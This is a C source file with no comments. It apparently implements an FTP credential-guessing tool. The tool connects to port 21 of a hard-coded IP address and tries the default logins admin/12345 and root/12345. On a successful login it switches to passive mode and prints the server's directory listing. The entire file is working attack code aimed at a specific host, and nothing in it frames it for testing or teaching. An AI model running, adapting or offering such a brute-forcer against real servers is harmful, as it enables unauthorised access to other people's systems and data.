#include <asm-generic/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

const char *passwd[2][2]={
	{"admin","12345"}, {"root","12345"}
};

static int probe(int fd, char *buf, size_t buflen)
{
	ssize_t n;
	if ((n=send(fd, buf, strlen(buf), 0))<0)
		return 0;
	printf("SEND  %s",buf);
	memset(buf, 0, buflen);
	if ((n=recv(fd, buf, buflen, 0))<0)
		return 0;
	printf("RECV  %s",buf);
	return 1;
}

static int try(int fd, const char *login, const char *pass)
{
	char cmd[BUFSIZ];
	int n,flag;

	n=flag=0;
	snprintf(cmd, BUFSIZ, "USER %s\r\n", login);
probe:
	if (!(n=probe(fd, cmd, BUFSIZ)))
		return 0;
	n=atoi(cmd);
	if (!flag) {
		if (n==230)
			return 1;
		if (n!=331)
			return 0;
		flag++;
	}
	else {
		if (n==230)
			return 1;
		return 0;
	}
	memset(cmd, 0, BUFSIZ);
	snprintf(cmd, BUFSIZ, "PASS %s\r\n", pass);
	goto probe;
}

static int listftp(int fd)
{
	u_char ip[16], p1, p2;
	struct sockaddr_in in;
	char cmd[BUFSIZ];
	u_short dataport;
	ssize_t n;
	int dfd;

	snprintf(cmd, BUFSIZ, "PASV\r\n");
	probe(fd, cmd, BUFSIZ);
	sscanf(cmd, "227 Entering Passive Mode (%hhu,%hhu,%hhu,%hhu,%hhu,%hhu)",
			&ip[0], &ip[1], &ip[2], &ip[3], &p1, &p2);
	snprintf((char*)ip, 16, "%hhu.%hhu.%hhu.%hhu", ip[0], ip[1], ip[2], ip[3]);
	dataport=(p1<<8)+p2;

	memset(&in, 0, sizeof(in));
	in.sin_family=AF_INET;
	in.sin_port=htons(dataport);
	inet_pton(in.sin_family,(char*)ip,&in.sin_addr);

	if ((dfd=socket(AF_INET, SOCK_STREAM, 0))<0)
		goto exit;
	if ((connect(dfd, (struct sockaddr *)&in, sizeof(in)))<0)
		goto exit;
	snprintf(cmd, BUFSIZ, "LIST\r\n");
	if ((n=send(fd, cmd, strlen(cmd), 0))<0)
		goto exit;
	printf("SEND  %s", cmd);
	memset(cmd, 0, BUFSIZ);

	for (;(n=recv(dfd, cmd, BUFSIZ, 0));)
		printf("%s\n", cmd);

	close(dfd);
	return 1;
exit:
	close(dfd);
	return 0;
}



int main(void)
{
	struct sockaddr_in in;
	struct timeval tv;
	char rbuf[BUFSIZ];
	ssize_t n,n1;
	int fd;

	if ((fd=socket(AF_INET,SOCK_STREAM,0))<0)
		return 0;

	memset(&in, 0, sizeof(in));
	in.sin_port=htons(21);
	in.sin_family=AF_INET;
	inet_pton(in.sin_family,"85.174.232.15",&in.sin_addr);

	tv.tv_sec=1, tv.tv_usec=0;
	if (setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv))<0)
		goto exit;

	if (connect(fd, (struct sockaddr *)&in, sizeof(in))<0)
		goto exit;
	if ((n=recv(fd, rbuf, BUFSIZ, 0))<0)
		goto exit;
	printf("CONNECT  %s",rbuf);

	for (n1=0;n1<2;n1++) {
		n=try(fd,passwd[n1][0],passwd[n1][1]);
		if (n) {
			listftp(fd);
			printf("\nSuccessful auth! %s:%s\n", passwd[n1][0],passwd[n1][1]);
			break;
		}
		printf("FAIL  %s:%s\n",passwd[n1][0],passwd[n1][1]);
	}

exit:
	close(fd);
	return 0;
}
